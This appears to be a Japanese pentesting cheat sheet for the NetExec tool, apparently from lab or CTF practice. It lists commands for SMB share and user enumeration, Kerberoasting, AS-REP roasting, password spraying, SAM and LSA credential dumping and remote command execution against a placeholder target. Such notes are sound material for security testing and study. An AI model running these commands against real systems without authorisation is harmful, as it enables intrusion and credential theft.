# nxc

## 列挙

### 共有フォルダ

```sh
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u 'guest' -p '' --shares
```

### ユーザー列挙

```sh
nxc smb $TARGET -u '' -p '' --rid-brute
```

### パスワードポリシー

```sh
nxc smb $TARGET -u 'guest' -p '' --pass-pol
```

## Kerberos

### Kerberoasting

```sh
nxc ldap $TARGET -u 'guest' -p '' --kerberoasting kerberoast.txt
nxc ldap $TARGET -u 'myuser' -p 'mypass' --kerberoasting kerberoast.txt
```

### AS-REP Roasting

```sh
nxc ldap $TARGET -u users.txt -p '' --asreproast as-rep.txt
```

### パスワードスプレー

```sh
nxc smb $TARGET -u users.txt -p 'Welcome123' --continue-on-success
```

## 認証取得後

### ユーザー情報

description 含めて見やすく出力できる

```sh
nxc ldap $TARGET -u 'user' -p 'pass' --users

LDAP                     10.48.189.229   389    LABYRINTH        -Username-                    -Last PW Set-       -BadPW- -Description-
LDAP                     10.48.189.229   389    LABYRINTH        Administrator                 2023-07-05 15:17:03 0       Tier 1 User
...
```

### プロトコル認証チェック

```sh
nxc winrm $TARGET -u 'user' -p 'pass'
nxc rdp $TARGET -u 'user' -p 'pass'
nxc smb $TARGET -u 'user' -p 'pass'
```

### 認証情報ダンプ

※成功したのは見たことが無い

```sh
nxc smb $TARGET -u 'Administrator' -p 'pass' --sam
nxc smb $TARGET -u 'Administrator' -p 'pass' --lsa
```

### コマンド実行

※成功したのは見たことが無い

```sh
nxc smb $TARGET -u 'admin' -p 'pass' -x 'whoami /all'
```
